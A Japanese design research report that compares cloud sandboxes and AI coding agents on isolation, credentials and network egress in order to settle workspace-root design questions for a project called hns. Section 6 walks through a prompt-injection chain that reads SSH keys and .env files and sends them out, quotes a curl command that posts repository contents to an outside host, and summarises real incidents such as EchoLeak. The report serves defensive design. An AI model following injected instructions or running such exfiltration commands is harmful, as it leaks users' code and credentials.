# agent サンドボックス設計調査（0127: Project と workspace root）

2026-11-17 / 調査: sandbox-research / 対象: 0127 の U-01（per-project DO）・U-02（root の相対/絶対）・U-03（root の変更）
確度: ✅ = 一次資料で確認、⚠️ = 資料からの推測、❓ = 未確認（末尾に一覧）

## 0. 結論（先に）

- **隔離の単位は「サンドボックス」ではなく「信頼の単位」に合わせる。** クラウド型はユーザー/タスク/セッション単位で VM かコンテナを分け、名前（sandbox id / machine id / DO 名）で同一性を決めていた。ローカル型（Claude Code）もセッション/コマンド単位で OS 境界を張る。複数の信頼単位で 1 つの実行環境を共有する製品は無い。→ **U-01 は per-project DO を支持**。
- **root はホスト絶対パスではなく「実行環境内の固定パス」として渡す。** クラウド製品は sandbox 内の固定ディレクトリや VM ディスクを渡し、ホストパスを API に出さない。hns の等価物は「マシン ROOT + 相対 POSIX パス」。→ **U-02 は相対を支持**。ただし結合と実体検査は Worker ではなくマシンで行う（§8 R3）。
- **root の同一性は作成時に固定する。** 全製品でスナップショット/VM ディスクが環境の同一性そのもので、後から差し替える操作は「別環境を作る」に等しい。→ **U-03 は固定を支持**。移動は「新 project + 新 DO + コピー」。
- **最大の残存リスクは prompt injection → exec → egress。** Cursor は「全コマンド自動実行 + 既定インターネット」の exfiltration リスクを自社ドキュメントで明記している。hns は現状 egress を切っておらず（D005）、資格情報の隠蔽だけでは足りない。→ **R6（egress 方針）を 0127 の設計に含めるべき**。
- **root 封じ込め ≠ 資格情報の封じ込め。** hns の bwrap は `--ro-bind / /` でホストを読み取り可能にする。`~/.config/hns` 以外（`~/.ssh`、`~/.aws`、`~/.config/gh`、マシン鍵）は今も読める。→ **R5 で hide をマシン設定由来に広げる**。

## 1. 方法と限界

- 一次資料は各製品の公式ドキュメント（Markdown 版がある場合はそれを優先）。取得は 2026-11-17 JST。
- 実機で試したのは hns のコード読解のみ。各製品のサンドボックスは契約していないため、**挙動は資料記述の範囲**。資料に無い内部実装（カーネル設定、cgroup、jailer 引数など）は推測しない。
- 価格・上限は変わる。本レポートでは「運用コストの構造」（常時課金か従量か、スナップショット課金か）だけを扱い、単価は書かない。
- 既知の攻撃は、公表 CVE と各社が明記する限界に限定した。未公表の脱出事例は扱わない。

## 2. サンドボックス基盤（8 件）

### 2.1 E2B

- **隔離**: 1 サンドボックス = 1 Firecracker microVM（専用カーネル）。「ハイパーバイザ境界であり、コンテナ/プロセス境界ではない」と明記。✅ [Security](https://e2b.dev/security)
- **workspace / root**: VM 内のファイルシステムが workspace。ホストパスは存在しない。テンプレート（OCI イメージ）から起動し、`/home/user` 配下で作業する（⚠️ 既定 cwd の正確な値は未確認）。
- **lifecycle**: 連続実行は Pro 24h / Hobby 1h。pause でファイルとメモリを保存し、**無期限に保持**（自動削除なし）。kill で終端。✅ [Lifecycle](https://docs.e2b.dev/sandbox) / [Persistence](https://docs.e2b.dev/sandbox/persistence)
- **資格情報**: サンドボックス作成時の `envs`、コマンド単位の `envs`。後者は「OS 上で private ではない」と明記。API キーは VM の外（SDK 側）にある。✅ [Environment variables](https://docs.e2b.dev/sandbox/environment-variables)
- **egress**: 既定で outbound 可。`allowInternetAccess:false` か、`denyOut`/`allowOut` で CIDR・ドメインの許可/拒否。ドメイン指定時は 8.8.8.8 を自動許可。✅ [Internet access](https://docs.e2b.dev/network/internet-access)
- **snapshot**: pause（メモリ込み）と filesystem-only snapshot、fork。✅ 同上
- **攻撃・限界**: (1) 2026-10-30 以降の新規プロジェクトは sandbox の public URL が既定 private だが、既存プロジェクトは public のまま。public だと URL を知る誰でも到達できる。✅ [Restricting public access](https://docs.e2b.dev/network/restrict-public-access) (2) Code Interpreter の 49999 番は「送られたコードを実行する」ため、public だと誰でも sandbox 内でコード実行・ファイル読み出しができる。✅ 同 (3) 169.254.169.254 は Firecracker の metadata service が応答する（SSRF の的になり得る）。✅ 同
- **hns への示唆**: 「pause しても sandbox id は同じ、状態は保持」という同一性モデルは、hns の「root を固定して Journal を紐づける」判断と同型。VM 内パスを外部 API に出さない点も参考。public URL の既定は **fail closed 側に倒す**（hns は inbound を開けないので同方向）。

### 2.2 Daytona

- **隔離**: sandbox = ハードウェア隔離 VM。Linux は Firecracker、Windows/GPU は Cloud Hypervisor、macOS は Apple Virtualization.framework。hypervisor が境界で、guest OS ではない。✅ [Isolation](https://www.daytona.com/docs/isolation)
- **workspace / root**: VM のファイルシステム。イメージ/スナップショットから起動。ホストパスは無い。✅ [Sandboxes](https://www.daytona.com/docs/sandboxes)
- **lifecycle**: create → start/stop → pause/resume → delete。**削除でファイルシステムは破棄**（永続は macOS の pause 等に限定）。✅ 同
- **資格情報**: API キーはプロジェクトスコープ。sandbox 内へは環境変数で渡す（⚠️ secret 専用機構の有無は未確認）。プロジェクト分離は「sandboxes / data / credentials へのアクセス」を分ける。✅ Isolation
- **egress**: **既定は open**。network policy は「sandbox の外で強制」され、内側の untrusted code からは解除できない。default-deny + allowlist（domain / IPv4 CIDR、合計 128 件）。**Windows と GPU sandbox は policy 非対応**。✅ [Network limits](https://www.daytona.com/docs/network-limits)
- **snapshot**: イメージ/スナップショットから起動、sandbox を snapshot として保存。✅ Sandboxes
- **攻撃・限界**: policy 非対応の sandbox 種別があること（Windows/GPU）。domain allowlist は host 名の制約で、仮想ホストの取り違えまでは防がない（Vercel も同様の注意を書く）。✅/⚠️
- **hns への示唆**: 「egress は外側で強制する」という原則は、bwrap の `--unshare-net` よりも上位（プロキシ/ファイアウォール）で持つべきという議論に使える。sandbox 種別ごとに保証が違う点は、hns の「非 Linux は exec を出さない」と同じ fail-closed の考え方。

### 2.3 Modal Sandboxes

- **隔離**: 2 ランタイム。既定は **gVisor**（アプリケーションカーネル）、必要なら **VM**（専用カーネル、Docker/FUSE/nested cgroup 用）。✅ [Sandboxes](https://modal.com/docs/guide/sandboxes)
- **workspace / root**: コンテナイメージ + Volume のマウント。ホストパスは無い。✅ 同
- **lifecycle**: 既定最大 5 分、`timeout` で最大 24h。idle timeout、readiness probe。24h 超は filesystem snapshot に保存して次の Sandbox で復元。✅ 同
- **資格情報**: `modal.Secret` を環境変数として注入。Sandbox は既定で Modal のリソース（Volume 等）へアクセスできない。✅ 同 / [Networking](https://modal.com/docs/guide/sandbox-networking)
- **egress**: 既定で outbound は任意の public IP へ可、**inbound は不可**。`block_network` / CIDR allowlist / domain allowlist（beta、TLS 443 のみ）。**DNS は全遮断時以外は無制限**。✅ Networking
- **snapshot**: filesystem snapshot、pause 相当。✅ Sandboxes
- **攻撃・限界**: (1) DNS が無制限なので、allowlist があっても DNS 経由の外向き通信が残る。✅ (2) `proxy_traffic_via_sidecar` を使うと 443 の CIDR allowlist が **sidecar の制御に置き換わる**（追加ではなく置換）。✅ (3) gVisor はハードウェア side channel を防がない。✅ [gVisor security](https://gvisor.dev/docs/architecture_guide/security/)
- **hns への示唆**: 「既定で inbound 不可、outbound は別制御」という分離は hns の形（マシンは inbound を開かない）と一致。DNS の穴は、hns が egress を絞るときに必ず考慮する（ドメイン allowlist だけでは不十分）。

### 2.4 Vercel Sandbox

- **隔離**: Firecracker microVM（専用カーネル）。**sudo を許す**設計で、microVM 内の特権を許容する。✅ [Security model](https://vercel.com/docs/sandbox/concepts/security)
- **workspace / root**: sandbox の専用ファイルシステム。ホストパスは無い。✅ 同
- **lifecycle**: 自動 timeout、停止で filesystem を自動保存し再開時に復元（**persistence が既定**）。最大 24h（changelog）。✅ [Persistence](https://vercel.com/docs/sandbox/concepts/persistent-sandboxes)
- **資格情報**: egress firewall の **credential brokering**（資格情報を sandbox 内に置かず、プロキシが外向き HTTPS に注入）。TLS 終端は sandbox 固有 CA。✅ [Firewall](https://vercel.com/docs/sandbox/concepts/firewall)
- **egress**: `allow-all`（既定）/ `deny-all`（DNS 含む）/ user-defined（domain、CIDR、denied CIDR）。実行中に更新可能。✅ 同
- **snapshot**: 自動 snapshot + 明示 snapshot、fork。✅ Persistence
- **攻撃・限界**: (1) 同一ホスト上の workload 間の **ハードウェア side channel は排除できない**（協調する 2 workload の低帯域通信）。✅ Security model (2) firewall の matcher だけでは遮断にならない（handling と組で決まる）。✅ Firewall (3) credential injection を使うと container 側に proxy CA を信頼させる必要がある。✅ Security model
- **hns への示唆**: **資格情報をサンドボックスに置かず、外向きで注入する**のは hns の provider gateway（0151）と同方向。hns は「キーを Worker に置く」で既にこれを満たす。root に資格情報を置かない設計を 0127 で崩さないこと。

### 2.5 Cloudflare Containers / Sandbox SDK

- **隔離**: sandbox = Durable Object + Container。Container は「独自のプロセスとディスクを持つ Linux VM インスタンス」。**sandbox が信頼の最小単位**で、同じ sandbox 内の全プロセスは同じ Linux・同じファイル・同じ localhost を見る。✅ [Sandbox security](https://developers.cloudflare.com/sandbox/concepts/security/)
- **workspace / root**: イメージのディスク。ホストパスは無い。sandbox 名（`getByName()`）が「どの sandbox のファイルに届くか」を決める。✅ 同 / [Lifetime](https://developers.cloudflare.com/sandbox/concepts/lifetime/)
- **lifecycle**: DO はストレージを保持、Container インスタンスは停止で消える。DO が inactive になってから最大 6h までインスタンス維持。snapshot がファイルを次インスタンスへ運ぶ。**idle でもメモリ/ディスク課金**。✅ Lifetime
- **資格情報**: 「sandbox に入れたものは全部読める」。例として、clone URL に token を入れると `.git/config` に残り、テスト依存のコードが読む。**資格情報は sandbox の外に置き、外向きで付与する**ことを推奨。✅ Security
- **egress**: Container は `enableInternet: false` が既定。Worker の outbound handler が intercept した通信だけ出る。Internet を ON にすると handler を通らない通信も出る。✅ 同
- **snapshot**: filesystem snapshot（token ごと保存される）。✅ Lifetime
- **攻撃・限界**: (1) 「別 Linux ユーザーにしてもファイル分離にならない。全プロセスが root と同じ capability を持つ」。✅ (2) sandbox 名を他ユーザーと共有すると前ユーザーのファイルが見える。✅ (3) snapshot は `.git/config` の token も運ぶ。✅ (4) preview をアプリと同じ hostname で出すと、アプリの cookie が preview ページに渡る。✅
- **hns への示唆**: **これが 0127 の設計に最も近い。**「DO 名が同一性を決める」「sandbox が信頼単位」「snapshot は資格情報も運ぶ」の 3 点は、per-project DO・root 固定・checkpoint の除外規則にそのまま効く。

### 2.6 Fly Machines

- **隔離**: Firecracker microVM。1 Machine = 1 VM、起動は 1 秒未満。✅ [Fly Machines](https://docs.fly.io/machines/overview)
- **workspace / root**: イメージから作る rootfs。永続は Volume をマウント。ホストパスは無い。✅ 同
- **lifecycle**: created → started → stopped → destroyed。stop/start は高速、clone で水平展開。✅ 同
- **資格情報**: app 単位の secrets を環境変数で注入（⚠️ machine 単位の分離可否は未確認）。例のシェルは `root@<machine>` で、VM 内は root。✅ 同
- **egress**: Firecracker 自体は**ネットワークフィルタをしない**。egress は host 側で filter すべき、と設計文書が明記。✅ [Firecracker design](https://github.com/firecracker-microvm/firecracker/blob/main/docs/design.md)
- **snapshot**: suspend で snapshot を試みる（保証はない）。Volume snapshot は別 API。✅ [Machines API](https://docs.fly.io/machines/) / overview
- **攻撃・限界**: VM 内が root なので、VM 内の全プロセスが同じ権限。ネットワーク制御は利用者責任。✅/⚠️
- **hns への示唆**: 「VM は強いが、egress と資格情報は別問題」という典型。hns のマシンは root で動く可能性があり、bwrap の uid map で内側を非特権にする意味を再確認できる。

### 2.7 GitHub Codespaces / devcontainers

- **隔離**: codespace ごとに**専用 VM**（2 つが同じ VM に載ることはない）。ネットワークも分離。✅ [Security in Codespaces](https://docs.github.com/en/codespaces/reference/security-in-github-codespaces)
- **workspace / root**: VM 上で repo を `/workspaces` に shallow clone し、dev container にマウント。**container への full root access** がある。✅ [Deep dive](https://docs.github.com/en/codespaces/about-codespaces/deep-dive)
- **lifecycle**: 作成/再起動ごとに新しい VM。停止・自動削除・prebuild。✅ Security / Deep dive
- **資格情報**: 作成/再起動ごとに新しい `GITHUB_TOKEN`（自動 expiry、repo 権限に応じた scope）。開発環境 secret は**環境変数としてコピー**され、terminal から `echo` できる。✅ Security
- **egress**: codespace は internet へ outbound 可。inbound は firewall で遮断。port forward は private が既定（public も選べる）。✅ 同
- **snapshot**: VM/コンテナの再作成。prebuild はイメージキャッシュ。✅ Deep dive
- **攻撃・限界**: (1) secret が環境変数なので、repo の依存コードから読める。✅ (2) public port forward は認証なしで世界から到達できる。✅ (3) devcontainer の lifecycle script は repo の設定で走る（`.mcp.json` 的な trust 問題）。✅ [devcontainers spec](https://containers.dev/implementors/json_reference/)
- **hns への示唆**: 「repo の設定ファイルが実行を起こす」経路は、hns の「project root を UI から選ばせ、repo 内の設定を信じない」方針の根拠になる。root を選ぶ UI は 0125 の tree から、が正しい。

### 2.8 Coder

- **隔離**: workspace = Terraform で定義した VM / Kubernetes Pod / コンテナ。管理者が template で image・resource・policy を固定。✅ [Coder Docs](https://coder.com/docs)
- **workspace / root**: workspace の home。ホストパスを API に出さない。✅/⚠️
- **lifecycle**: idle で自動停止、数秒で再開。✅ 同
- **資格情報**: **Coder Agents は「workspace に LLM の API キーを置かない」**（control plane のみ）。✅ [Architecture](https://coder.com/docs/ai-coder/agents/architecture)
- **egress**: workspace を「control plane と git provider 以外すべて遮断」できる。✅ 同
- **snapshot**: Terraform の再適用/再作成。❓ workspace のディスク snapshot の詳細は未確認。
- **攻撃・限界**: (1) agent は**ユーザーと同じ権限**で動く（権限昇格はしないが、ユーザーができることはできる）。✅ (2) agent の接続経路は IDE と同じ Tailnet（新しい経路を作らない）。✅ (3) workspace 内のプロセス権限（root か否か）は template 依存。❓
- **hns への示唆**: **「制御プレーンに鍵、実行環境に鍵を置かない」**を製品の構造的保証にしている点が hns と同型。hns の Worker/DO が鍵を持ち、マシンが持たない（0194 の C4）を 0127 でも崩さない。

## 3. コーディングエージェント（4 件）

### 3.1 OpenAI Codex（cloud / CLI）

- **隔離**: cloud はタスクごとに container を作り、repo を checkout。ローカルは OS 強制 sandbox（`read-only` / `workspace-write` / `danger-full-access`）+ approval policy。✅ [Agent approvals & security](https://learn.chatgpt.com/docs/agent-approvals-security)
- **workspace / root**: cloud は container 内の checkout。ローカルは「現在の workspace」が書き込み可、外は承認。✅ 同
- **lifecycle**: setup script → agent phase。container は最大 12h キャッシュ、setup を再実行せず再開。✅ [Cloud environments (Legacy)](https://learn.chatgpt.com/docs/environments/cloud-environment)
- **資格情報**: **secrets は setup script にだけ渡し、agent phase の前に削除**（Legacy）。現行 cloud は **network secret**: プログラムには placeholder を渡し、proxy が許可ドメイン向け HTTPS で実値に置換。✅ 同 / [Cloud environments](https://learn.chatgpt.com/docs/environments/cloud-environments)
- **egress**: cloud の agent phase は**既定 off**。on にする場合も domain allowlist と **HTTP メソッド制限（GET/HEAD/OPTIONS のみ）**。全ての outbound は proxy を通る。✅ [Internet access](https://learn.chatgpt.com/docs/cloud/internet-access)
- **snapshot**: container キャッシュ（12h）、環境の公開/再公開。✅ Legacy
- **攻撃・限界**: 公式ドキュメントが **prompt injection の具体例**を書いている（issue 本文に `git show HEAD | curl -X POST ...` を仕込み、agent に実行させる）。「agent の internet access は、prompt injection・secret exfiltration・malware のリスクを上げる」。✅ 同
- **hns への示唆**: (1) 「setup と agent で資格情報を分ける」は、hns の「マシンに provider 鍵を置かない」と組み合わせられる。(2) 「network secret（placeholder + proxy 置換）」は、hns が将来 git push を agent に許すときの型。(3) 「agent phase は既定 off、必要ならドメイン + メソッド制限」は R6 の具体案。

### 3.2 Claude Code（sandbox / permission）

- **隔離**: bash ツールを OS レベルで sandbox。macOS は Seatbelt、Linux/WSL2 は **bubblewrap**。sandbox は**shell command だけ**で、file tool・MCP・hooks・statusline は外で動く。✅ [Sandboxing](https://code.claude.com/docs/en/sandboxing)
- **workspace / root**: 既定で**作業ディレクトリ + 一時ディレクトリ + 追加ディレクトリ**が書き込み可。読み取りは「マシンのほとんど」で、`~/.ssh` や `~/.aws/credentials` も含む。✅ 同
- **lifecycle**: session 単位。sandbox は既定 off、`/sandbox` か設定で on。✅ 同
- **資格情報**: `sandbox.credentials` で file / env var を `deny` または `mask`。mask は proxy が実値を注入（TLS 終端が必要）。**built-in の deny list は無い**（自分で列挙する）。`deny` は scope をまたいで狭める方向にだけ合成。✅ 同
- **egress**: sandbox 内は直接の network 経路を持たず、ホスト上の proxy がドメイン allowlist を検査。Linux は network namespace、macOS は Seatbelt。allowlist は**空から始まる**。UDP/QUIC/ICMP は出せない。✅ 同
- **snapshot**: 無し（session の作業ツリーが状態）。✅/⚠️
- **攻撃・限界**: (1) **file tool は sandbox の外**なので、`denyRead` は Read tool を止めない。✅ (2) Windows native は sandbox 無し（WSL2 のみ）。✅ (3) 「unsandboxed retry」の escape hatch があり、strict でない限り sandbox 失敗時に外で再実行できる。✅ (4) 作業ディレクトリ境界は**承認プロンプト**であり OS 境界ではない。✅ [Security](https://code.claude.com/docs/en/security) (5) MCP server はユーザー権限で動く。✅
- **hns への示唆**: hns の `createSandboxEnv` は Claude Code とほぼ同じ構図（bwrap + 作業 root 書き込み + host read-only + env 消去）。**違いは「読み取りの deny が無い」こと**。Claude Code が `~/.ssh` を既定で読ませたまま `denyRead` を用意しているのは、hns が hide を増やすべき根拠になる。

### 3.3 Cursor Cloud Agents

- **隔離**: agent ごとに専用 VM。**Firecracker microVM**、Cursor の本番とは別 AWS アカウント。✅ [Security overview](https://cursor.com/docs/cloud-agent/security)
- **workspace / root**: VM のディスクに repo を clone。VM snapshot が環境。✅ 同
- **lifecycle**: start → provision → run → persist → hand off → recycle。idle で hibernate、VM snapshot は**無操作 30 日**で削除。✅ 同
- **資格情報**: Environment Variable / **Runtime Secret**（transcript・commit から `[REDACTED]`、ただし terminal からは見える）/ Build Secret（Docker build のみ）。OIDC の短期 token、HSM 署名 commit。✅ [Secrets & Network](https://cursor.com/docs/cloud-agent/security-network)
- **egress**: **既定で internet access あり**。user/team/environment 単位で domain 制限。✅ 同
- **snapshot**: VM disk snapshot（暗号化、30 日）。✅ Security overview
- **攻撃・限界**: 公式が「**agent は全 terminal command を自動実行する**。auto-run は data exfiltration リスクを導入する。攻撃者が prompt injection で agent を騙し、コードを悪意あるサイトへ upload させ得る」と明記。✅ Security & Network
- **hns への示唆**: **これが hns の将来像に最も近い失敗例**。hns は「agent の bash を自動実行 + egress 開放」なので、Cursor と同じリスクを既に持つ。差は「人間の承認 UI が無い」こと。R6 か承認ゲートのどちらかが要る。

### 3.4 Devin

- **隔離**: session ごとに **Linux VM**。organization の snapshot から起動。✅ [Environment](https://docs.devin.ai/onboard-devin/environment)
- **workspace / root**: VM のファイルシステム。**session の変更は snapshot に戻らない**（毎回クリーン）。✅ 同
- **lifecycle**: snapshot（build）→ session（fresh copy）。✅ 同
- **資格情報**: Secrets（global / personal / repo / session）。`Redact value` が既定で、UI から再表示できない。✅ [Secrets](https://docs.devin.ai/product-guides/secrets)
- **egress**: Security Profile の **network policy は allowlist**（host / CIDR、`*` ワイルドカード）。session の全 network（shell・browser・install）に適用。**必要な宛先（git proxy 等）は自動許可**。✅ [Security Profiles](https://docs.devin.ai/product-guides/security-profiles)
- **snapshot**: golden snapshot / blueprint。✅ [Snapshots](https://docs.devin.ai/product-guides/snapshots)
- **攻撃・限界**: (1) allowlist でブロックされると Devin が「アクセスを要求」し、承認で session 中だけ追加される（人間の承認が egress を広げる）。✅ (2) CLI の sandbox は bwrap + socat 必須で、**解決できなければ起動を拒否（fail closed）**。Windows は非対応で hard-fail。✅ [CLI Sandbox](https://docs.devin.ai/cli/sandbox) (3) cookie/TOTP を渡す設計上、資格情報の価値が高い。✅ Secrets
- **hns への示唆**: 「session の変更を snapshot に戻さない」は、hns の「root を固定し、checkpoint は別管理」という分離に通じる。egress の承認が人間に依存する点は、hns に承認 UI が無いことの代替にならない。

## 4. OS プリミティブ

| 機構 | 何を隔離するか | 強さ / 既知の限界 | hns での位置づけ |
| --- | --- | --- | --- |
| bubblewrap | mount / pid / ipc / uts / user / net namespace を引数で構成 | **「完成した sandbox ではなく、引数が方針そのもの」**。TIOCSTI 対策に `--new-session` か seccomp が要る（CVE-2017-5226）。bind したもの（D-Bus socket 等）は昇格に使える。✅ [README](https://github.com/containers/bubblewrap) | 現行の exec 基盤。引数の追加（`--new-session`、hide、net）で強度が変わる |
| namespaces | PID / mount / net / user / IPC / UTS / cgroup / time | 単独では権限境界にならない。user namespace が無いと bwrap は動かない。✅ [namespaces(7)](https://man7.org/linux/man-pages/man7/namespaces.7.html) | 既に pid/ipc/uts を使用。net は未使用 |
| seccomp | syscall 番号と引数値 | **パスは見られない**（ポインタを辿れない）。vdso の syscall は filter できない。allowlist はアプリごとに調整が要る。✅ [seccomp(2)](https://man7.org/linux/man-pages/man2/seccomp.2.html) | 現状未使用。bwrap の `--seccomp` で追加可能だが、まず `--new-session` |
| Landlock | ファイル階層・TCP/UDP port・capability・namespace（ABI 依存） | 非特権で自分に制約を課せる。**ABI ごとに機能差**（network は v4 で TCP、v10 で UDP、v12 で cap/ns）。カーネルが対応していなければ使えない。✅ [Landlock](https://docs.kernel.org/userspace-api/landlock.html) | bwrap が使えないカーネルの第 2 候補。read-only bind の再現に自前コードが要る |
| gVisor | syscall をユーザー空間の Sentry が解釈 | ホストカーネルへの露出を減らす。**ハードウェア side channel は防がない**。✅ [Intro](https://gvisor.dev/docs/architecture_guide/intro/) / [Security](https://gvisor.dev/docs/architecture_guide/security/) | 自前運用では重い。クラウド sandbox の内部実装として参考 |
| Firecracker / microVM | ハードウェア仮想化（KVM） | 境界は hypervisor。**ネットワークフィルタはしない**（host 側で filter する前提）。jailer 前提。✅ [design.md](https://github.com/firecracker-microvm/firecracker/blob/main/docs/design.md) | マシン分離の究極形。hns は 1 マシン = 1 ユーザーなので、まず bwrap + root で足りる |

補足: gVisor の説明は「Linux のカーネル security primitive は、sandbox されたアプリを**ホストカーネルから 1 syscall の距離**に置く」と明言している。bwrap を使う限り、カーネル脆弱性は残余リスクとして残る（✅ Intro）。

## 5. 比較表

### 5.1 サンドボックス基盤

| 製品 | 隔離単位 | root の渡し方 | 資格情報 | egress | snapshot | 運用コストの構造 |
| --- | --- | --- | --- | --- | --- | --- |
| E2B | 1 sandbox = 1 microVM | VM 内パス（ホストパス無し） | 作成時/コマンド単位の env。API キーは外 | 既定 on、allow/deny 可 | pause（メモリ込み）/ FS snapshot、無期限 | 実行時間 + 保持。pause は無期限保持 |
| Daytona | 1 sandbox = 1 VM | VM 内パス | env（プロジェクトスコープ） | 既定 open、外部強制の allowlist | image/snapshot | 実行時間 + 保証リソース |
| Modal | 1 Sandbox = gVisor or VM | コンテナ image + Volume | Secret を env 注入 | 既定 outbound 可、inbound 不可 | FS snapshot | 実行時間 + 24h 上限 |
| Vercel | 1 sandbox = 1 microVM | sandbox FS | proxy が注入（brokering） | 3 モード + 実行中更新 | 自動 snapshot が既定 | 実行時間 + snapshot  storage |
| Cloudflare | 1 sandbox = DO + Container | コンテナ image のディスク | 外に置き outbound で付与 | **既定 off**、handler 経由のみ | filesystem snapshot | **idle でも課金**、インスタンス時間 |
| Fly | 1 Machine = 1 microVM | image rootfs + Volume | app secrets（env） | 制御なし（利用者責任） | suspend / Volume snapshot | 起動時間 + 常時/停止 |
| Codespaces | 1 codespace = 1 VM + container | `/workspaces` を mount | 自動 `GITHUB_TOKEN` + secrets を env | outbound 可、inbound 遮断 | VM/container 再作成、prebuild | 実行時間 + storage |
| Coder | 1 workspace = Terraform 資源 | workspace home | **workspace に鍵を置かない** | control plane と git 以外を遮断可 | Terraform 再作成 | 自前ホスト、idle 停止 |

### 5.2 コーディングエージェント

| 製品 | 隔離単位 | root の渡し方 | 資格情報 | egress | snapshot | 運用コストの構造 |
| --- | --- | --- | --- | --- | --- | --- |
| Codex cloud | 1 task = 1 container | container 内 checkout | setup のみ / network secret は proxy 置換 | **既定 off**、allowlist + method 制限 | container cache 12h | 実行時間 + cache |
| Claude Code | session + bash sandbox | 作業ディレクトリ（+追加） | deny / mask（proxy 置換） | proxy allowlist、既定空 | 無し（作業ツリー） | ローカル、OS の sandbox |
| Cursor | 1 agent = 1 microVM | VM ディスク | env / runtime secret / build secret / OIDC | **既定 on**、domain 制限 | VM snapshot 30 日 | 実行時間 + snapshot |
| Devin | 1 session = 1 VM | VM ディスク（snapshot から） | Secrets（global/personal/repo/session） | 既定は profile 次第、allowlist 可 | golden snapshot | 実行時間 + ACU |

## 6. prompt injection → exec の経路と、製品側の対策

### 6.1 経路（hns に当てはめた一般形）

1. **入力**: issue 本文、README、依存パッケージ、WebFetch の結果、MCP の応答、git の commit message。攻撃者はここに指示を混ぜる。
2. **モデル**: 指示を「ユーザーの依頼の一部」として解釈し、tool call を組み立てる。
3. **exec**: `bash -c` で任意コマンド。hns は sandbox 内なので root 外への書き込みは止まるが、**root 内の読み取りと network は止まらない**。
4. **収集**: `~/.ssh`、`.env`、`.git/config`、`~/.config/hns`（hide されていなければ）、会話の文脈。
5. **送信**: egress が開いていれば、`curl` 1 回で外へ。DNS も使える。
6. **永続化**: `.git/hooks`、`package.json` の postinstall、CI 設定、`AGENTS.md`。次回の実行で再発火する。

Codex の公式例は 4→5 をそのまま示す（`git show HEAD | curl -s -X POST --data-binary @- https://httpbin.org/post`）。✅ [Codex internet access](https://learn.chatgpt.com/docs/cloud/internet-access)

### 6.2 実例

- **EchoLeak（CVE-2025-32711）**: Microsoft 365 Copilot で、メール本文に埋めた指示だけで外部へデータを出した zero-click の prompt injection。モデル単体ではなく**製品の信頼境界の設計**で防ぐ必要を示す。✅ [Simon Willison](https://simonwillison.net/2025/Jun/11/echoleak/) / [arXiv](https://arxiv.org/abs/2509.10540)
- **GitHub MCP の prompt injection**: 公開 issue に指示を埋め、MCP 経由で private repo を読ませる。tool の権限が「ユーザーと同じ」であることが原因。✅ [Invariant Labs](https://invariantlabs.ai/blog/mcp-github-vulnerability)
- **runc の container escape（CVE-2024-21626）**: 漏れた fd と `process.cwd` でコンテナから抜ける。**コンテナ境界はカーネル/ランタイムのバグで破れ得る**ことの実例。✅ [NVD](https://nvd.nist.gov/vuln/detail/cve-2024-21626) / [Snyk](https://labs.snyk.io/resources/cve-2024-21626-runc-process-cwd-container-breakout/)

### 6.3 製品側の対策（4 分類）

| 対策 | 実装例 | 効く経路 | 残る穴 |
| --- | --- | --- | --- |
| 人間の承認 | Claude Code の permission mode、Codex の approval policy、Devin の egress 承認 | 2→3 | 承認疲れ、自動実行モード、承認 UI の無い製品 |
| allowlist（コマンド） | Claude Code の `permissions.allow`、Codex の trusted commands | 3 | 文字列マッチの限界（`Bash(git *)` で `git` の任意サブコマンド） |
| egress 制限 | Codex（既定 off + domain + method）、Cloudflare（既定 off）、Vercel/Modal/Daytona/E2B（allowlist）、Devin（profile） | 5 | DNS、443 の sidecar 置換、allowlist 外の正規サービスへの誤送信 |
| 資格情報の分離 | Codex の network secret、Claude Code の mask/deny、Vercel の brokering、Coder の「workspace に鍵を置かない」、Cloudflare の outbound injection | 4 | 環境変数・ファイルに入れた時点で読める。snapshot が運ぶ |

**hns への含意**: hns は「人間の承認」も「コマンド allowlist」も持たない。持っているのは「sandbox（root 封じ込め）」と「資格情報の hide」だけ。したがって **egress を絞るか、承認を入れるか**のどちらかを 0127 以降で決める必要がある。両方無いまま「agent に bash を許す」のは、Cursor が自社ドキュメントで警告している構成と同じ。

## 7. hns の現状（コードで確認した事実）

- `createSandboxEnv` は `--die-with-parent --ro-bind / / --bind <root> <root> --dev /dev --proc /proc [--tmpfs /tmp] --clearenv --setenv PATH/HOME ... --tmpfs <hide> --unshare-pid --unshare-ipc --unshare-uts --chdir <cwd>` を組み立てる。✅ [packages/workspace/src/sandbox.ts](packages/workspace/src/sandbox.ts)
- **`--unshare-net` は無い**（D005 の範囲で network を許す設計）。✅ 同
- **`--new-session` は無い**。bwrap の README が TIOCSTI 対策として要求する引数。✅ 同 / [bubblewrap README](https://github.com/containers/bubblewrap)
- **hide は呼び出し側が渡す**（`createSandboxEnv({ hide })`）。現状は `~/.config/hns` のみ。`~/.ssh`、`~/.aws`、`~/.config/gh`、マシン鍵は hide されない。✅ [docs/safety.md](docs/safety.md)
- **cwd は root 外なら root に丸める**（拒否ではない）。cwd は封じ込めの境界ではない。✅ sandbox.ts
- **bwrap が無ければ exec を登録しない**（fail closed）。検出は platform → binary → version → 実 probe。✅ [sandbox.ts](packages/workspace/src/sandbox.ts) / [docs/safety.md](docs/safety.md)
- **root の同一性**は `<root>/.hns/root.json` の id と照合。✅ [workspace.ts](packages/workspace/src/workspace.ts) / [rooted-helper.ts](packages/workspace/src/rooted-helper.ts)
- 既知の残存: `root` 内の `.hns` / `.hns-tmp-*` は agent から見える。TOCTOU の最終窓（dirfd）は v0.1 で許容。✅ [docs/safety.md](docs/safety.md)

## 8. 選択肢の評価（0127 の U-01 / U-02 / U-03）

### 8.1 U-01: per-project DO か、1 Session DO + env(target) か

**per-project DO を支持する。**

- **信頼単位と調整単位が一致する。** Cloudflare は「sandbox が信頼の最小単位」「sandbox 名がどのファイルに届くかを決める」と明記。1 DO に複数 project を載せると、**root の取り違えが 1 箇所のバグで全 project に漏れる**。✅ [Cloudflare Security](https://developers.cloudflare.com/sandbox/concepts/security/)
- **既存の D049 と一致する。** D049 は「1 ワークスペース = 1 Session + 1 Workspace DO」。project = workspace と定義するなら、DO 名 = projectId が自然。✅ [docs/decisions.md](docs/decisions.md)
- **Journal / lease / 版の分離。** 0156 は Workspace DO が root ごとに Journal・lease・版を持つ。複数 project を 1 DO に入れると、版の名前空間と lease の範囲を project で分ける追加実装が要る（バグの面が増える）。
- **反対意見（1 Session DO + env(target)）の利点は「WS / resolver を変えずに済む」だけ**で、security 上の利点は無い。0127 の目的は「project 切替が実際に別のファイル空間を開く」ことなので、分離を構造で保証する方が目的に合う。
